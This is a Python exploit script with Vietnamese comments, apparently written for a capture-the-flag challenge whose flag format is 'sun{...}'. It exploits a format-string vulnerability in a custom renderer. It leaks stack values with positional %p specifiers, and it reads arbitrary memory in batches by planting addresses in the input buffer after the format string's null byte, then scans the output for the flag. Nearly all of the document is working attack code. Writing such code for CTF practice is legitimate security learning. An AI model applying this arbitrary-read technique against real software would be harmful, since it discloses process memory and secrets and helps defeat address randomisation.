#!/usr/bin/env python3
"""Doc hang loat nhieu dia chi tuy y trong ONE round-trip.

Renderer tu che cho phep %<n>$s (in chuoi tai dia chi = arg n) va %<n>$p (in
chinh gia tri arg n). Arg n nam tai buf[8*(n-6)] va buf do input cua ta ghi len,
nen muon doc dia chi X chi can dat 8 byte X vao slot tuong ung - slot do nam SAU
byte 0 ket thuc format nen khong bi parser đọc phải.

Doc 8 byte tai mot dia chi tuy y = %s roi parse: gia tri con tro kieu 0x7f..
luon co 2 byte cao bang 0 nen %s tra ve dung 6 byte thap, du de tai lap dia chi
day du 64 bit.
"""
import re
import sys

sys.path.insert(0, ".")
from probe import Renderer

FLAG = re.compile(rb"sun\{[^}\n]{1,200}\}")


def plan(n, kind):
    """Chon offset cua slot dau tien sao cho doan format + n slot <= 511 byte."""
    off = 16
    for _ in range(80):
        first = 6 + off // 8
        spec = b"".join(b"%%%d$%s|" % (first + i, kind) for i in range(n))
        new = max(16, ((len(spec) + 8) // 8) * 8)
        if new == off:
            break
        off = new
    assert off + 8 * n <= 511, f"{n} slot khong vut buf (can {off + 8*n})"
    return spec, first, off


def read_batch(r, addrs, kind=b"s", size=20, timeout=4.0):
    """Goi read theo tung nhom `size` dia chi, tra ve danh ket qua."""
    results = []
    for i in range(0, len(addrs), size):
        chunk = addrs[i : i + size]
        spec, first, off = plan(len(chunk), kind)
        p = spec + b"\n" + b"." * (off - len(spec) - 1)
        for a in chunk:
            p += a.to_bytes(8, "little")
        out = r.render(p, timeout)
        results.extend(out.split(b"|")[:-1])
    return results


def as_ptr(b):
    if b is None or len(b) < 6:
        return None
    return int.from_bytes(b[:6] + b"\x00\x00", "little")


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "leak"
    r = Renderer()
    r.drain()
    r.buf = b""
    if mode == "leak":
        # chi so arg -> offset trong buf; lay cac gia tri tri tre o lai
        spec = b"".join(b"%%%d$p|" % i for i in range(6, 66)) + b"\n"
        out = r.render(spec)
        for j, p in enumerate(out.split(b"|")[:-1]):
            m = re.match(rb"0x([0-9a-f]{1,16})", p)
            v = int(m.group(1), 16) if m else 0
            if v > 0x1000:
                print(f"  arg {6+j:3d} buf[{8*(6+j-6):#05x}] = {v:#018x}")
    elif mode == "qwords":
        base = int(sys.argv[2], 0)
        cnt = int(sys.argv[3])
        addrs = [base + 8 * k for k in range(cnt)]
        for k, part in enumerate(read_batch(r, addrs, b"s", size=20)):
            v = as_ptr(part)
            print(f"  {base + 8*k:#018x} = {part!r}" + (f"  -> {v:#x}" if v else ""))
    elif mode == "strings":
        base = int(sys.argv[2], 0)
        step = int(sys.argv[3]) if len(sys.argv) > 3 else 32
        cnt = int(sys.argv[4]) if len(sys.argv) > 4 else 40
        addrs = [base + step * k for k in range(cnt)]
        for k, part in enumerate(read_batch(r, addrs, b"s", size=20)):
            if part and len(part) > 2:
                print(f"  {addrs[k]:#x}: {part[:160]}")
                if FLAG.search(part):
                    print("[+] CO:", FLAG.search(part).group())
    r.close()
